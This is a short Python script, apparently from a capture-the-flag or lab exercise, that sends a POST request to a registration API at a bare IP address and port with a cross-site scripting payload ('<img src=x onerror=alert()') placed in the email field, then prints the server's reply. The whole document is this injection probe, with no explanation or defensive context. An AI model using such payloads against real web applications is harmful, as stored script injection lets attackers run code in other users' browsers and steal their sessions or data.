import requests
url = "http://83.136.254.53:45241/api/register"
res = requests.post(url,json={'email':'<img src=x onerror=alert()'})
print(res.text)
